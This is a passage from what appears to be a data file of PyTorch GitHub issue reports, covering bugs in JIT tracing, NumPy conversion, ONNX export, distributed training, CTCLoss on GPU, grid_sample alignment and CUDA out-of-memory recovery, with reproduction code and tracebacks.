    return (torch.ones(2) * z ** 2 - z).sum()

torch.set_default_tensor_type(torch.cuda.FloatTensor)
jf = torch.jit.trace(f, torch.tensor(1.))

z = torch.tensor(1., requires_grad=True)
y = jf(z)
print(torch.autograd.grad(y, (z,))[0])

z = torch.tensor(1., requires_grad=True)
y = f(z)
print(torch.autograd.grad(y, (z,))[0])
```
gives
```
tensor(6.)
tensor(2.)
```

## Expected behavior

Get the same result for both jit and non-jit version: `torch.tensor(2.)`

## Environment

 - PyTorch Version (e.g., 1.0): 1.1.0
 - OS (e.g., Linux): Linux
 - How you installed PyTorch (`conda`, `pip`, source): conda
 - Python version: 3.6
 - CUDA/cuDNN version: 10.0
 - GPU models and configuration: RTX 2070
",True
[Bug] torch.from_numpy fails to convert np.int32 when np.dtype.num=7 module: error checking triaged module: numpy small,"## üêõ Bug

I ran into the following error when trying to convert an integer numpy ndarray to a torch tensor:
`>>> torch.from_numpy(b)`

> Traceback (most recent call last):
>   File ""<input>"", line 1, in <module>
> TypeError: can't convert np.ndarray of type numpy.int32. The only supported types are: float64, float32, float16, int64, int32, int16, int8, and uint8.
> 

## To Reproduce
Here's some example code that triggers it

```python
import numpy as np
import torch
a = np.array([1,2,3])
torch.from_numpy(a) # This works fine
```

> tensor([1, 2, 3], dtype=torch.int32)

```python
b = a % 2
b
```

> array([1, 0, 1], dtype=int32)
```python
torch.from_numpy(b)
```

> Traceback (most recent call last):
>   File ""<input>"", line 1, in <module>
> TypeError: can't convert np.ndarray of type numpy.int32. The only supported types are: float64, float32, float16, int64, int32, int16, int8, and uint8.


---

I was looking through the members/properties of the dtype in a debugger, and I notice
`np.dtype.num` changed from 7 to 5 after the modulus:

```python
b.dtype , b.dtype.num
```
> (dtype('int32'), 5)
```python
a.dtype, a.dtype.num
```
> (dtype('int32'), 7)

---

I can work around it by using `b.astype(int)` and this works fine, but it's just confusing that the error message in torch complains it's not an int32 when it is.

## Environment
windows10
Anaconda python 3.6 env 
torch                1.1.0 (installed via conda)
numpy                1.16.2+mkl
",True
RuntimeError: ONNX export failed: Couldn't export operator aten::one_hot module: onnx triaged,"## üêõ Bug

Export of `F.one_hot` to ONNX format fails.

## To Reproduce
```
class TestMod(nn.Module):
    def __init__(self, size, maxint=10):
        super().__init__()
        self.maxint = maxint
        self.weight = torch.randint(0, maxint, [size])

    def forward(self, x):
        return F.one_hot(self.weight, num_classes=self.maxint)
test = TestMod(3)
torch.onnx.export(test, test.weight, ""test.onnx"", verbose=True)
```

```
---------------------------------------------------------------------------
RuntimeError                              Traceback (most recent call last)
<ipython-input-23-0b35ee7f95af> in <module>
      8         return F.one_hot(self.weight, num_classes=self.maxint)
      9 test = TestMod(3)
---> 10 torch.onnx.export(test, test.weight,""test.onnx"", verbose=True)

~/miniconda3/lib/python3.6/site-packages/torch/onnx/__init__.py in export(*args, **kwargs)
     23 def export(*args, **kwargs):
     24     from torch.onnx import utils
---> 25     return utils.export(*args, **kwargs)
     26 
     27 

~/miniconda3/lib/python3.6/site-packages/torch/onnx/utils.py in export(model, args, f, export_params, verbose, training, input_names, output_names, aten, export_raw_ir, operator_export_type, opset_version, _retain_param_name, do_constant_folding, strip_doc_string)
    129             operator_export_type=operator_export_type, opset_version=opset_version,
    130             _retain_param_name=_retain_param_name, do_constant_folding=do_constant_folding,
--> 131             strip_doc_string=strip_doc_string)
    132 
    133 

~/miniconda3/lib/python3.6/site-packages/torch/onnx/utils.py in _export(model, args, f, export_params, verbose, training, input_names, output_names, operator_export_type, export_type, example_outputs, propagate, opset_version, _retain_param_name, do_constant_folding, strip_doc_string)
    367         if export_params:
    368             proto, export_map = graph._export_onnx(params_dict, opset_version, defer_weight_export, operator_export_type,
--> 369                                                    strip_doc_string)
    370         else:
    371             proto, export_map = graph._export_onnx({}, opset_version, False, operator_export_type, strip_doc_string)

RuntimeError: ONNX export failed: Couldn't export operator aten::one_hot
```

## Expected behavior

Export of graph to ONNX format using reference to ONNX's one_hot.

## Environment

 - PyTorch Version (e.g., 1.0): 1.1.0
 - OS (e.g., Linux): Linux
 - How you installed PyTorch (`conda`, `pip`, source): conda
 - Python version: 3.6.8

## Additional context

Can probably be solved by adding ONNX's one_hot:
https://github.com/onnx/onnx/blob/master/onnx/backend/test/case/node/onehot.py
to:
https://github.com/pytorch/pytorch/blob/v1.1.0/torch/onnx/symbolic.py
",True
"Dependency issues with torch.utils.tensorboard: ""No module named past"" and ""No module named 'PIL'"" module: dependency bug triaged","```
Python 3.7.3 (default, Mar 27 2019, 22:11:17)
[GCC 7.3.0] :: Anaconda, Inc. on linux
Type ""help"", ""copyright"", ""credits"" or ""license"" for more information.
>>> torch.__version__
'1.2.0.dev20190607'
```

```
Type ""help"", ""copyright"", ""credits"" or ""license"" for more information.
>>> import torch.utils.tensorboard
Traceback (most recent call last):
  File ""<stdin>"", line 1, in <module>
  File ""/miniconda/lib/python3.7/site-packages/torch/utils/tensorboard/__init__.py"", line 6, in <module>
    from .writer import FileWriter, SummaryWriter  # noqa F401
  File ""/miniconda/lib/python3.7/site-packages/torch/utils/tensorboard/writer.py"", line 17, in <module>
    from ._convert_np import make_np
  File ""/miniconda/lib/python3.7/site-packages/torch/utils/tensorboard/_convert_np.py"", line 12, in <module>
    from caffe2.python import workspace
  File ""/miniconda/lib/python3.7/site-packages/caffe2/python/workspace.py"", line 15, in <module>
    from past.builtins import basestring
ModuleNotFoundError: No module named 'past'
```

`pip install future` fixes this problem, but it should rather be added to the requirements.txt or mentioned explicitly in the docs.

However then another issue happens:
```
Traceback (most recent call last):
  File ""train.py"", line 6, in <module>
    import torch.utils.tensorboard
  File ""/miniconda/lib/python3.7/site-packages/torch/utils/tensorboard/__init__.py"", line 6, in <module>
    from .writer import FileWriter, SummaryWriter  # noqa F401
  File ""/miniconda/lib/python3.7/site-packages/torch/utils/tensorboard/writer.py"", line 18, in <module>
    from ._embedding import make_mat, make_sprite, make_tsv, append_pbtxt
  File ""/miniconda/lib/python3.7/site-packages/torch/utils/tensorboard/_embedding.py"", line 6, in <module>
    from PIL import Image
ModuleNotFoundError: No module named 'PIL'
```

Docs mention dependency on `pillow`, but only for `add_image` and `add_images`. I think it should not break during import.",True
Ambiguous torch.Tensor int vs float comparison triaged module: type promotion,"## üêõ Bug

Ambiguous torch.Tensor int vs float comparison

## To Reproduce
input: torch.Tensor([0]).int() < 0.5
output: tensor([0], dtype=torch.uint8)

## Expected behavior
Expected numpy-like behavior:
input: torch.Tensor([0]).int() < 0.5
output: tensor([1])

- PyTorch 1.0.1
- Ubuntu 18.04",True
Unexpected output size for Maxpool module: nn triaged,"The output of Maxpool has an unexpected size for some corner cases.

Repro:
Maxpool1d(kernel_size=3, stride=2, padding=0, dilation=2)
input=torch.randn(1,1,4)

If I use the L_out formula from the documentation (https://pytorch.org/docs/stable/nn.html?highlight=maxpool#torch.nn.MaxPool1d) to compute the output size, I get {1,1,0}.
However, the output generated has a size of {1, 1, 1}.

And with ONNX, the same operation results in an output of shape {1,1,0}
(https://github.com/microsoft/onnxruntime/issues/1224).

Since this case is not mentioned in the documentation, I was wondering if this is a special case that is handled separately by design (to avoid returning an output with a dim of 0), or if it is a bug.
",True
Stream safety of MAGMA functions high priority module: internals triaged,"#21785 showed that `at::svd()` is not stream-safe.  `at::svd()` uses `magma_dgesdd()`.

According to  http://icl.cs.utk.edu/magma/forum/viewtopic.php?f=2&t=1080, the old way of making MAGMA functions stream-safe is:

```
lock()
magmablasSetKernelStream( s1 )
magma_dgemm( ... )
unlock() 
```

The new way is using a `magma_queue_t`, but not all functions have it.  In particular `magma_dgesdd()` doesn't appear to have this parameter.


I'm not sure if either of these methods can be integrated into `pytorch`.  Meanwhile, the functions should probably raise an error if a non-default stream is detected.
",True
Make DDP failure recoverable oncall: distributed module: autograd triaged,"@kuttas @pietern and I had a discussion on how to make DDP failure recoverable. The process involves the following steps:

```python
m = SomeModel()
dist.init_process_group()
ddp = DistributedDataParallel(m)
# got error
dist.destroy_process_group()
dist.init_process_group()
del ddp
ddp = DistributedDataParallel(m)
```

This does not work in today's DDP. Currently, to get better performance, DDP assigns the [original module](https://github.com/pytorch/pytorch/blob/fa4ca4e70e98fbe944d1435929ea4fd17c7bed7d/torch/nn/parallel/distributed.py#L316) to the first module replica instead of creating a new one. Then, it creates a new `Reducer` to [add post hooks](https://github.com/pytorch/pytorch/blob/fa4ca4e70e98fbe944d1435929ea4fd17c7bed7d/torch/csrc/distributed/c10d/reducer.cpp#L108-L112) to sync params. However, because every reconstructed DDP instance wraps the same original module, all their reducers will add hooks to the same set of variables. Hence, after 10 recoveries, each param (variable) in the original module will have 11 hooks introduced by 11 different reducers, where only the last one is still alive. We thought about several potential solutions:

#### Solution 1: Force Module Replication

Force DDP to create new module replicas instead of using the original module. In this way, those variables in the replicas will die together with the DDP instance. But it will make the DDP slower. Maybe make it an option?

#### Solution 2: Delete Hooks in Destructor

I feel the best way would be deleting those hooks from model variables when destructing a `Reducer`, but I didn't find a clean way to do that. The [`add_post_hook`](https://github.com/pytorch/pytorch/blob/fa4ca4e70e98fbe944d1435929ea4fd17c7bed7d/torch/csrc/autograd/function.h#L250) function takes unique parameters, and we can get those hooks through [`post_hooks`](https://github.com/pytorch/pytorch/blob/fa4ca4e70e98fbe944d1435929ea4fd17c7bed7d/torch/csrc/autograd/function.h#L254). Directly looping through the the hooks vector and find the target to delete seems to be too hackish.

#### Solution 3: Create New Variables (?)

Not sure if this can work. Instead of creating replica (as in Solution 1), let DDP create a new variable for every parameter in the original module. All DDP forward and backward pass will use those new variables. I think this won't work if the application only wraps part of the model using DDP, because there will be two disjoint autograd graphs (?)


@soumith @gchanan @ezyang  thoughts?
",True
Use of Tensor.contiguous() unconditionally results in Mypy linting errors high priority module: typing triaged small,"## üêõ Bug

In `tools/pyi/gen_pyi.py` there is no type hint provided for `Tensor.contiguous()` (`Tensor.is_contiguous()` is there however).  As a result uses of `.contiguous()` cause Mypy linting errors.  

In the case I had the line (the context and details of the tensors doesn't matter):

```
re_batched = seq_first.contiguous().view(expanded_tokens.size(1), -1).transpose(0, 1)
```

gives the linting error:

```
error: ""Tensor"" has no attribute ""contiguous""; maybe ""is_contiguous""?
```

## To Reproduce

Any use of `Tensor.contiguous` will produce this when linted with MyPy

## Expected behavior

No error should be reported

## Environment

PyTorch Version (e.g., 1.0): 1.1.0
OS (e.g., Linux): MacOS
How you installed PyTorch (conda, pip, source): conda
Build command you used (if compiling from source): N/A
Python version: 3.6
CUDA/cuDNN version: N/A
GPU models and configuration: None
Any other relevant information: None",True
Reindexing a huge tensor to shuffle it results in data loss at the end of the tensor triaged,"## üêõ Bug

Shuffling a huge tensor by reindexing into it results in all of the values past a certain point being set to 0 when the reindexing is done in GPU memory.

@colesbury  This likely relates to https://github.com/pytorch/pytorch/issues/20562 as the issue is also with reindexing and also shows up at the same point in the tensor.  Hopefully this helps with narrowing the other issue.

I initially thought this was limited to longtensors, but if you use a floattensor with 2x values you run into the exact same issue in the exact same place. 

## To Reproduce

Steps to reproduce the behavior:

1. Create a huge longtensor (>536870700 values) of random values.  I went with 15Mx45
2. Load it into gpu memory
3. Reindex to shuffle the values

Data past ~536870700 will be all 0.  The data is zero'd mid tensor.

Here's a notebook that reproduces the issue:
https://github.com/EvenOldridge/HugeTensor/blob/master/Huge%20Tensor%20Bug%20-%20Data%20Loss.ipynb

## Expected behavior

Data should not be lost when reindexing

## Environment

- PyTorch Version (e.g., 1.0): 1.01
- OS (e.g., Linux): Linux (Ubuntu 16.04)
- How you installed PyTorch (conda, pip, source): pip
- Python version: 3.6
- CUDA/cuDNN version: 10.0
- GPU models and configuration: TeslaV100 32 Gig (on a DGX-1)
",True
grid_sample is not aligned triaged module: vision,"`F.interpolate` has been changed to use `align_corners=False` by default, which is also the pixel model used by opencv/PIL, etc.

The input to `grid_sample` is in range `[-1, 1]`, and therefore should ideally be scale-invariant.
However, `F.grid_sample` still uses the old pixel model: https://github.com/pytorch/pytorch/blob/65b00aa5972e23b2a70aa60dec5125671a3d7153/aten/src/ATen/native/cuda/GridSampler.cu#L161-L162, and as a result it is not properly aligned under the scaling of `F.interpolate(align_corners=False)`. 

Examples:

```python
import torch
from torch.nn import functional as F

def grid_sample_v2(input, grid):
    # grid: [-1, 1]
    N, C, H, W = input.shape
    gridx = grid[:, :, :, 0]
    gridy = grid[:, :, :, 1]
    gridx = ((gridx + 1) / 2 * W - 0.5) / (W - 1) * 2 - 1
    gridy = ((gridy + 1) / 2 * H - 0.5) / (H - 1) * 2 - 1
    newgrid = torch.stack([gridx, gridy], dim=-1)
    return F.grid_sample(input, newgrid)

N = 500
input = torch.rand(N, 1, 32, 74)
input2 = F.interpolate(input, scale_factor=5, align_corners=False, mode='bilinear')

grid = torch.rand(N, 18, 17, 2) * 1.8 - 0.9  # use coordinates in -0.9, 0.9 to avoid boundary effects

output = F.grid_sample(input, grid)
output2 = F.grid_sample(input2, grid)
diff = torch.abs(output2 - output)
print(""DIFFv1:"", diff.mean())

output = grid_sample_v2(input, grid)
output2 = grid_sample_v2(input2, grid)
diff = torch.abs(output2 - output)
print(""DIFFv2:"", diff.mean())
```
The above code, when run with `align_corners=True`, prints:
```
DIFFv1: tensor(0.0032)
DIFFv2: tensor(0.0675)
```
when run with `align_corners=False`, prints:
```
DIFFv1: tensor(0.0689)
DIFFv2: tensor(5.3741e-07)
```
In the example, I provide a new implementation of `grid_sample`, which leads to smaller reconstruction error when `align_corners=False`. Given that `align_corners=False` is now the default for `interpolate`, similar options should be built into `grid_sample` as well.",True
Type conversion from float64 to float32 (cpu) sometimes crashes high priority triaged,"```python
import torch

a = torch.rand(3, 3, dtype = torch.float64)
print(a.dtype, a.device) # torch.float64 cpu
c = a.to(torch.float32)
#works

b = torch.load('bug.pt')
print(b.dtype, b.device) # torch.float64 cpu
c = b.to(torch.float32)
# RuntimeError: expected scalar type Float but found Double

d = b.clone().to(torch.float32)
# works
```

[bug.zip](https://github.com/pytorch/pytorch/files/3202664/bug.zip)
",True
Build error with MSVC (aten\src\ATen\native\quantized\Copy.cpp) oncall: quantization triaged,"## üêõ Bug

```
..\aten\src\ATen\native\quantized\Copy.cpp(18): error C2065: 'src_data': undeclared identifier
..\aten\src\ATen\native\quantized\Copy.cpp(18): error C2672: 'at::quantize_val': no matching overloaded function found
..\aten\src\ATen\native\quantized\Copy.cpp(26): error C2780: 'T at::quantize_val(float,int32_t,float)': expects 3 arguments - 2 provided
```

## To Reproduce

Steps to reproduce the behavior:

```
set CMAKE_GENERATOR=""Visual Studio 16 2019"" x64

set DISTUTILS_USE_SDK=1

""C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Auxiliary\Build\vcvarsall.bat"" x64

set CMAKE_GENERATOR=Ninja

set REL_WITH_DEB_INFO=1

python setup.py install
```
",True
distributed all_reduce deadlocks in v1.1 oncall: distributed module: cuda triaged,"## üêõ Bug

I'm doing multi-node training (8 nodes, 8 gpu's each, NCCL backend) and am using `DistributedDataParallel` for syncing grads and `distributed.all_reduce()` calls to log losses. I recently upgraded from Pytorch v1.0 to v1.1 and after doing so, my training script hangs at a `distributed.all_reduce()` call. The hang doesn't occur if I downgrade pytorch to v1.0. It also hangs if I use the pytorch-nightly version.
Some observations about the deadlock that might be useful:

1. The script deadlocks exactly after the same number of training iterations (7699). Changing the model architecture changed this number, but it's still the same for different runs of the same architecture.

2. In all the runs, the hang occurs at an all_reduce of a single element gpu tensor created as follows:
```
loss = loss.item()
sum = torch.tensor(loss * batch).float().cuda() //as batch could be different on each rank
distributed.all_reduce(sum)
sum = sum.item()
```
All ranks complete line 3, but only ranks = {0,8,16,...,56} ie ranks with local_rank=0 complete line 4. I checked if different processes are accessing the same GPU, however each process is using it's corresponding gpu (set using `torch.cuda.set_device(local_rank)`, though all GPU's are visible to each process). I tried adding a `dist.barrier()` after the `all_reduce()`, or using the same tensor for sum always (instead of creating a new one), however it still hangs, and always after the same number of iterations (7699). 
3. The reduction within the DDP itself hasn't hung in any of my runs yet. I tried setting `find_unused_parameters=True`, however that didn't help.
4. I looked at NCCL debug logs using `NCCL_DEBUG_SUBSYS=COLL NCCL_DEBUG=INFO`, and no errors were thrown. The last calls corresponded to all reduce calls for a 1 element tensor. It's fewer calls than the previous iteration though. 
## To Reproduce

It takes about 7 hrs for the deadlock to happen, and it's hard for me to share the code. I'll try see if I can come up with a simpler script that reproduces the deadlock.

## Environment
```
PyTorch version: 1.1.0
Is debug build: No
CUDA used to build PyTorch: 10.0.130

OS: Ubuntu 16.04.5 LTS
GCC version: (Ubuntu 5.4.0-6ubuntu1~16.04.11) 5.4.0 20160609
CMake version: version 3.11.1

Python version: 3.6
Is CUDA available: Yes
CUDA runtime version: 10.0.130

GPU models and configuration:                                                                                                          GPU 0: Tesla V100-SXM2-16GB                                                                                                            GPU 1: Tesla V100-SXM2-16GB
GPU 2: Tesla V100-SXM2-16GB
GPU 3: Tesla V100-SXM2-16GB
GPU 4: Tesla V100-SXM2-16GB
GPU 5: Tesla V100-SXM2-16GB
GPU 6: Tesla V100-SXM2-16GB
GPU 7: Tesla V100-SXM2-16GB

Nvidia driver version: 410.79
cuDNN version: /usr/lib/x86_64-linux-gnu/libcudnn.so.7.1.4

Versions of relevant libraries:                                                                                                        [pip3] numpy==1.16.3                                                                                                                   [pip3] tcop-pytorch==0.0.0
[pip3] torch==1.1.0
[pip3] torchvision==0.2.2.post3
[conda] blas                      1.0                         mkl
[conda] mkl                       2019.3                      199
[conda] mkl_fft                   1.0.12           py36ha843d7b_0
[conda] mkl_random                1.0.2            py36hd81dba3_0
[conda] pytorch                   1.1.0           py3.6_cuda10.0.130_cudnn7.5.1_0    pytorch                                           [conda] tcop-pytorch              0.0.0                    pypi_0    pypi
[conda] torchvision               0.2.2.post3              pypi_0    pypi
```",True
nn.CTCLoss RuntimeError on GPU module: nn module: loss module: cuda triaged,"## üêõ Bug

nn.CTCLoss Run the official documentation sample code works fine on the CPU but  RuntimeError on the GPU.

## To Reproduce

```py
import torch
import torch.nn as nn
import torch.nn.functional as F

>>> T = 255      # Input sequence length
>>> C = 20      # Number of classes (excluding blank)
>>> N = 16      # Batch size
>>> S = 30      # Target sequence length of longest target in batch
>>> S_min = 10  # Minimum target length, for demonstration purposes
>>>
>>> # Initialize random batch of input vectors, for *size = (T,N,C)
>>> input = torch.randn(T, N, C).log_softmax(2).detach().requires_grad_()
>>>
>>> # Initialize random batch of targets (0 = blank, 1:C+1 = classes)
>>> target = torch.randint(low=1, high=C+1, size=(N, S), dtype=torch.long)
>>>
>>> input_lengths = torch.full(size=(N,), fill_value=T, dtype=torch.long)
>>> target_lengths = torch.randint(low=S_min, high=S, size=(N,), dtype=torch.long)

input = input.cuda()
target = target.cuda()
input_lengths = input_lengths.cuda()
target_lengths = target_lengths.cuda()

>>> ctc_loss = nn.CTCLoss()
>>> loss = ctc_loss(input, target, input_lengths, target_lengths)
>>> loss.backward()
```

```
---------------------------------------------------------------------------
RuntimeError                              Traceback (most recent call last)
<ipython-input-10-24c5c245c677> in <module>
      1 ctc_loss = nn.CTCLoss()
      2 loss = ctc_loss(input, target, input_lengths, target_lengths)
----> 3 loss.backward()

~/anaconda3/lib/python3.7/site-packages/torch/tensor.py in backward(self, gradient, retain_graph, create_graph)
    105                 products. Defaults to ``False``.
    106         """"""
--> 107         torch.autograd.backward(self, gradient, retain_graph, create_graph)
    108 
    109     def register_hook(self, hook):

~/anaconda3/lib/python3.7/site-packages/torch/autograd/__init__.py in backward(tensors, grad_tensors, retain_graph, create_graph, grad_variables)
     91     Variable._execution_engine.run_backward(
     92         tensors, grad_tensors, retain_graph, create_graph,
---> 93         allow_unreachable=True)  # allow_unreachable flag
     94 
     95 

RuntimeError: setStorage: sizes [16, 255, 31], strides [15045, 59, 2], and storage offset 0 requiring a storage size of 240722 are out of bounds for storage with numel 240720
```

See https://gist.github.com/ypw-rich/faafe22d108c4fe24f128ecb4aaabda3

## Expected behavior

Expect same grad on CPU.

## Environment

PyTorch version: 1.1.0
Is debug build: No
CUDA used to build PyTorch: 10.0.130

OS: Ubuntu 18.04.2 LTS
GCC version: (Ubuntu 7.4.0-1ubuntu1~18.04) 7.4.0
CMake version: version 3.10.2

Python version: 3.7
Is CUDA available: Yes
CUDA runtime version: 10.0.130
GPU models and configuration: GPU 0: GeForce GTX 1080 Ti
Nvidia driver version: 418.56
cuDNN version: /data/ocr/bin/libcudnn.so.7

Versions of relevant libraries:
[pip3] numpy==1.16.2
[pip3] numpydoc==0.8.0
[pip3] torch==1.1.0
[pip3] torchvision==0.2.2.post3
[conda] blas                      1.0                         mkl
[conda] mkl                       2019.3                      199
[conda] mkl-service               1.1.2            py37he904b0f_5
[conda] mkl_fft                   1.0.10           py37ha843d7b_0
[conda] mkl_random                1.0.2            py37hd81dba3_0
[conda] torch                     1.1.0                    pypi_0    pypi
[conda] torchvision               0.2.2.post3              pypi_0    pypi
",True
index_put_ no longer accepts indices with non-matching backend module: error checking triaged,"## üêõ Bug
in index_put_ operation indices backend now has to match source backend. It used to be not necessary, so that e.g. cuda tensor could be indexed by cpu tensor. Blame points to #17991  https://github.com/pytorch/pytorch/blob/master/aten/src/ATen/native/Indexing.cpp#L204

## To Reproduce
```
import torch

a=torch.arange(30, dtype=torch.float).view(5,6).cuda()
ind0 = torch.arange(0,a.size(0), step=2)
gO = torch.randn(a[ind0].size()).cuda()
a.index_put_((ind0,), gO, accumulate=True)
torch.cuda.synchronize()
```
used to work, now it does not. Note that forward operation with ind0 on the cpu still works (`a[ind0]`), but index_put_ breaks
## Expected behavior
Either clarification in the docs and in the code that indices tensor has to have the same backend as source tensor, or fixing the RuntimeError. In case we want to disable indexing with a different backend, it would make sense to disable it for the forward indexing operation too, right now forward would be fine, but backward will through a runtime error. 

## Environment
Pytorch 1.1 binary and recent source builds

cc @colesbury 

",True
libtorch does not initialize OpenMP/MKL by default high priority module: docs module: cpp triaged module: multithreading,"I find that matrix multiplication is slower in C++ API, so I write the same code in C++ and python and record their execution times, code is as following:

**C++:**
```
#include<torch/torch.h>
#include<iostream>
#include <chrono>

int main(){
	torch::Tensor tensor = torch::randn({2708, 1433});
	torch::Tensor weight = torch::randn({1433, 16});
	auto start = std::chrono::high_resolution_clock::now();
	tensor.mm(weight);
	auto end = std::chrono::high_resolution_clock::now();
	std::cout<< ""C++ Operation Time(s) "" << std::chrono::duration<double>(end - start).count() << ""s"" << 	std::endl;
	return 0;
}
```

**Result**:
```
C++ Operation Time(s) 0.082496s
```

**python:**
```
import torch
import torch.nn as nn
import torch.nn.functional as F

tensor = torch.randn(2708, 1433)
weight = torch.randn(1433, 16)
t0 = time.time()
tensor.mm(weight)
t1 = time.time()
print(""Python Operation Time(s) {:.4f}"".format(t1 - t0))
```

**Result**:
```
Python Operation Time(s) 0.0114
```

**Testing Environment:**
```
ubuntu 16.04
gcc version 5.4.0
python version 3.7.3
pytorch version 1.0.1
```

It's not a small difference, why is it happen???
",True
CosineAnnealingWarmRestarts documentation poor and not appearing module: docs triaged,"## üìö Documentation

The documentation for the newly introduced `CosineAnnealingWarmRestarts` learning rate scheduler (#17226) does not appear on the website (see [here](https://pytorch.org/docs/stable/optim.html); the location where it should be).

Furthermore, looking at the [source code of the function](https://github.com/pytorch/pytorch/blob/master/torch/optim/lr_scheduler.py#L699), I am very confused about how to use the scheduler.

Specifically, if we look at the documentation of `.step()`, we first see a clear typo, where `CosineAnnealingWarmRestarts` is called `SGDR`. But the provided example is not sufficient to use as a reference. Where did the value 26 come from and why, and what does it have to do with 10 iterations? Also, [the paper](https://arxiv.org/abs/1608.03983) on which this scheduler is based states that the LR should be updated every _batch_, not epoch. I believe the statement in the documentation `SGDR.step(0.1), SGDR.step(0.2)` is referring to this, but I am lost in the example.

If I try to ignore the docstring and look at the source code, my best guess is that the correct message for the docstring in `.step` should be something like:

```python
""""""Step should be called after every time a batch is processed in addition to after each epoch,
   like in the following example:

         >>> scheduler = CosineAnnealingWarmRestarts(optimizer, T_0, T_mult)
         >>> for epoch in range(N):
         >>>     scheduler.step(epoch)
         >>>     for inputs, labels in trainloader:
         >>>         optimizer.zero_grad()
         >>>         outputs = net(inputs)
         >>>         loss = criterion(outputs, labels)
         >>>         loss.backward()
         >>>         optimizer.step()
         >>>         scheduler.step()
""""""
```

Is this correct? Or have I misinterpreted how to apply this function?

Thanks for the great work and please let me know if I can help in some way.",True
[JIT] Cannot access nn.Linear.in_features in ScriptModule oncall: jit triaged,"## üêõ Bug

```python
import torch.nn as nn
import torch.jit as jit

class TestModule(jit.ScriptModule):
  def __init__(self):
    super().__init__()
    self.linear = nn.Linear(16, 16)


m = TestModule()
print(m.linear.in_features)
```

The code above throws AttributeError

```python
>>> m.linear.in_features
Traceback (most recent call last):
  File ""/home/qbx2/anaconda3/lib/python3.7/site-packages/torch/jit/__init__.py"", line 1197, in __getattr__
    return ScriptModule.__getattr__(self, attr)
  File ""/home/qbx2/anaconda3/lib/python3.7/site-packages/torch/jit/__init__.py"", line 1102, in __getattr__
    return Module.__getattr__(self, attr)
  File ""/home/qbx2/anaconda3/lib/python3.7/site-packages/torch/nn/modules/module.py"", line 535, in __getattr__
    type(self).__name__, name))
AttributeError: 'WeakScriptModuleProxy' object has no attribute 'in_features'

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File ""<stdin>"", line 1, in <module>
  File ""/home/qbx2/anaconda3/lib/python3.7/site-packages/torch/jit/__init__.py"", line 1200, in __getattr__
    return getattr(self.__dict__[""_original""](), attr)
AttributeError: 'NoneType' object has no attribute 'in_features'
```

## Expected behavior

Looking at the code (https://github.com/pytorch/pytorch/blob/master/torch/jit/__init__.py#L1226), I think WeakScriptModuleProxy should have copied in_features and other fields to self here.

## Environment

Collecting environment information...
PyTorch version: 1.0.1.post2
Is debug build: No
CUDA used to build PyTorch: 10.0.130

OS: Ubuntu 18.04.1 LTS
GCC version: (Ubuntu 7.3.0-27ubuntu1~18.04) 7.3.0
CMake version: Could not collect

Python version: 3.7
Is CUDA available: Yes
CUDA runtime version: 10.0.130
GPU models and configuration: GPU 0: GeForce RTX 2080
Nvidia driver version: 410.48
cuDNN version: /usr/local/cuda-10.0/lib64/libcudnn.so.7.4.1

Versions of relevant libraries:
[pip] numpy==1.15.4
[pip] numpydoc==0.8.0
[pip] torch==1.0.1.post2
[conda] blas 1.0 mkl
[conda] mkl 2019.1 144
[conda] mkl-service 1.1.2 py37he904b0f_5
[conda] mkl_fft 1.0.6 py37hd81dba3_0
[conda] mkl_random 1.0.2 py37hd81dba3_0
[conda] pytorch 1.0.1 py3.7_cuda10.0.130_cudnn7.4.2_2 pytorch

https://discuss.pytorch.org/t/cannot-access-nn-linear-in-features-in-scriptmodule/42833",True
[onnx] crash when exporting a model with Sequence module (encodeBlock: Assertion failled ) high priority module: onnx triaged module: assert failure,"## üêõ Bug

The tracer in onnx exporter is failing with an assertion error in the exporter.

## To Reproduce

Steps to reproduce the behavior:

1. define a model:

```
class SomeModel(nn.Module):

    def __init__(self):
        super(SomeModel, self).__init__()
        dim = 5
        self.emb = nn.Embedding(10, dim)
        self.lin1 = nn.Linear(dim, 1)
        self.seq = nn.Sequential(
            self.emb,
            self.lin1,
        )

    def forward(self, input):
        return self.seq(input)

model = SomeModel()
```

2. run export:

```
dummy_input = torch.tensor([2], dtype=torch.long)
dummy_input

torch.onnx.export(model, dummy_input, ""model.onnx"", verbose=True)
```

fails with:

```
[redacted]/vendor/local/lib/python2.7/site-packages/torch/onnx/utils.pyc in _export(model, args, f, export_params, verbose, training, input_names, output_names, operator_export_type, export_type, example_outputs, propagate)
    230     defer_weight_export = export_type is not ExportTypes.PROTOBUF_FILE
    231     if export_params:
--> 232         proto, export_map = graph.export(params, _onnx_opset_version, defer_weight_export, operator_export_type)
    233     else:
    234         proto, export_map = graph.export([], _onnx_opset_version, False, operator_export_type)

RuntimeError: torch/csrc/jit/export.cpp:296: encodeBlock: Assertion `b->inputs().size() >= num_initializers` failed.
```

## Expected behavior

Model is exported to ONNX

## Environment

```
Collecting environment information...
PyTorch version: 0.4.1
Is debug build: No
CUDA used to build PyTorch: 9.0.176

OS: Ubuntu 16.04.6 LTS
GCC version: (Ubuntu 5.4.0-6ubuntu1~16.04.11) 5.4.0 20160609
CMake version: Could not collect

Python version: 2.7
Is CUDA available: No
CUDA runtime version: No CUDA
GPU models and configuration: No CUDA
Nvidia driver version: No CUDA
cuDNN version: No CUDA

Versions of relevant libraries:
[pip] msgpack-numpy==0.4.3.1
[pip] numpy==1.14.1
[pip] torch==0.4.1
[conda] Could not collect
```

## Additional context

As a workaround one can inline layer definitions into the sequence:

```
class SomeModel(nn.Module):

    def __init__(self):
        super(SomeModel, self).__init__()
        dim = 5
        self.seq = nn.Sequential(
            nn.Embedding(10, dim),
            nn.Linear(dim, 1),
        )

    def forward(self, input):
        return self.seq(input)

model = SomeModel()
```
",True
Inconsistent recovery from CUDA OOMs high priority oncall: distributed module: autograd module: memory usage triaged has workaround,"## üêõ Bug

**Editorial note:** Make sure that you are not holding on to tensors via an exception object (which contains the stack trace and will retain tensors). Do not bring the exception object into scope, or do error recovery outside of the catch block.

Catching a RuntimeError on a CUDA OOM should allow one to gracefully recover, for example by lowering the batchsize. This is particularly important when using DistributedDataParallel, where workers must sync on backward, and so it's important that we be able to perform a ""dummy batch"" after an OOM in order to stay in sync with other workers.

Observed behavior during a CUDA out of memory event is inconsistent across nondistributed/dataparallel/distributeddataparallel. Expected behavior is that all modes should be able to recover easily.


## To Reproduce
Test case and logs available here:
https://gist.github.com/stephenroller/bd2cd644e7c117c1ec8192639ecf30b6


Steps to reproduce the behavior:

